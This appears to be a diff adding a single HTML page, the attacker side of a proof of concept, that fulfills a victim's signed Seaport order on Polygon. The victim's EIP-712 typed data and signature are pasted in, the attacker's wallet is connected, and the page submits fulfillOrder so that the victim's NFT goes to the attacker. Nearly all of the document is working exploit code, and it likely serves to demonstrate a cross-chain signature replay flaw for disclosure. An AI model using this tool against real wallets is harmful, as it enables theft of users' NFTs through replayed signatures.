@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html><head><title>Attacker: Fulfill cross-chain Seaport order</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.1/ethers.umd.min.js"></script>
+</head>
+<body style="font-family:monospace;padding:20px;max-width:780px">
+<h3>Attacker: Fulfill the victim's cross-chain Seaport order</h3>
+<p>Paste the victim's typed data + signature. Switch to Polygon. Click Fulfill.<br>
+The NFT transfers from the victim to you; the POL consideration goes to them.</p>
+
+<h4>1. Typed data JSON (victim's <code>window.__typed</code>)</h4>
+<textarea id="typedIn" rows="6" style="width:100%;font-size:11px;box-sizing:border-box" placeholder='{"domain":{"chainId":137,...},"primaryType":"OrderComponents","types":{...},"message":{...}}'></textarea>
+
+<h4>2. Victim's signature</h4>
+<textarea id="sigIn" rows="2" style="width:100%;font-size:11px;box-sizing:border-box" placeholder="0x..."></textarea>
+
+<h4>3. Fulfill</h4>
+<button onclick="doConnect()" style="padding:8px 16px;font-size:14px">Connect Wallet</button>
+<button onclick="doFulfill()" style="padding:8px 20px;font-size:14px;background:#dc2626;color:#fff;border:none;border-radius:4px;cursor:pointer">Fulfill Order</button>
+<pre id="out" style="white-space:pre-wrap;background:#eee;padding:10px;margin-top:12px">waiting...</pre>
+<script>
+const { ethers } = window.ethers || {};
+const SEAPORT = '0x0000000000000068F116a894984e2DB1123eB395';
+let signer = null;
+
+function log(x){ document.getElementById('out').textContent = x; }
+
+async function doConnect(){
+  try {
+    const provider = new ethers.BrowserProvider(window.okxwallet || window.ethereum);
+    signer = await provider.getSigner();
+    const net = await provider.getNetwork();
+    log('connected: ' + signer.getAddress() + '\nnetwork: ' + net.name + ' (chainId ' + net.chainId + ')');
+    if (Number(net.chainId) !== 137) {
+      log('connected: ' + await signer.getAddress() + '\n\nWARNING: you are on chainId ' + net.chainId + '.\nSwitch to Polygon (137) first for fulfillment to work.\nClick Connect again after switching.');
+      try {
+        await (window.okxwallet || window.ethereum).request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x89' }] });
+        log('switched to Polygon');
+      } catch(e) { log('switch failed, switch manually: ' + (e.message || e)); }
+    }
+  } catch(e) { log('connect error: ' + (e.message || e)); }
+}
+
+async function doFulfill(){
+  if (!signer) { log('connect wallet first'); return; }
+  const typedStr = document.getElementById('typedIn').value.trim();
+  const sig = document.getElementById('sigIn').value.trim();
+  if (!typedStr || !sig) { log('paste both the typed data JSON and the signature'); return; }
+
+  let typed;
+  try { typed = JSON.parse(typedStr); } catch(e) { log('invalid JSON: ' + e.message); return; }
+
+  const m = typed.message;
+  const offer = m.offer[0];
+  const cons = m.consideration[0];
+  const value = BigInt(cons.startAmount);
+
+  log('order summary:\n' +
+      '  offerer (victim): ' + m.offerer + '\n' +
+      '  domain chainId: ' + typed.domain.chainId + '\n' +
+      '  offer: ERC721 #' + offer.identifierOrCriteria + ' at ' + offer.token + '\n' +
+      '  consideration: ' + ethers.formatEther(value) + ' native -> ' + cons.recipient + '\n\n' +
+      'building fulfillOrder calldata...');
+
+  try {
+    // Seaport 1.6 fulfillOrder ABI
+    const seaportABI = [
+      'function fulfillOrder((address offerer, address zone, (uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount)[] offer, (uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount, address recipient)[] consideration, uint8 orderType, uint256 startTime, uint256 endTime, bytes32 zoneHash, uint256 salt, bytes32 conduitKey, uint256 counter) order, bytes signature) external payable returns (bool fulfilled)'
+    ];
+    const contract = new ethers.Contract(SEAPORT, seaportABI, signer);
+
+    const order = {
+      offerer: m.offerer,
+      zone: m.zone,
+      offer: m.offer.map(o => ({
+        itemType: o.itemType,
+        token: o.token,
+        identifierOrCriteria: BigInt(o.identifierOrCriteria),
+        startAmount: BigInt(o.startAmount),
+        endAmount: BigInt(o.endAmount)
+      })),
+      consideration: m.consideration.map(c => ({
+        itemType: c.itemType,
+        token: c.token,
+        identifierOrCriteria: BigInt(c.identifierOrCriteria),
+        startAmount: BigInt(c.startAmount),
+        endAmount: BigInt(c.endAmount),
+        recipient: c.recipient
+      })),
+      orderType: m.orderType,
+      startTime: BigInt(m.startTime),
+      endTime: BigInt(m.endTime),
+      zoneHash: m.zoneHash,
+      salt: BigInt(m.salt),
+      conduitKey: m.conduitKey,
+      counter: BigInt(m.counter || 0)
+    };
+
+    log('submitting fulfillOrder with msg.value = ' + ethers.formatEther(value) + ' POL...');
+    const tx = await contract.fulfillOrder(order, sig, { value: value.toString() });
+    log('transaction submitted: ' + tx.hash + '\nwaiting for confirmation...');
+    const receipt = await tx.wait();
+    if (receipt.status === 1) {
+      log('SUCCESS! tx: ' + tx.hash + '\n\nThe NFT has been transferred from the victim to you.\nThe POL consideration was sent to the victim.\n\nFull receipt:\n' + JSON.stringify({ status: receipt.status, blockNumber: receipt.blockNumber, gasUsed: receipt.gasUsed.toString() }, null, 1));
+    } else {
+      log('FAILED. tx: ' + tx.hash + '\nstatus: ' + receipt.status);
+    }
+  } catch(e) {
+    log('fulfillment error: ' + (e.reason || e.message || e) + '\n\nIf the error mentions "insufficient balance", the wallet needs POL.\nIf it mentions "InvalidSigner" or "OrderAlreadyFilled", the signature or order is stale.');
+  }
+}
+</script>
+</body></html>
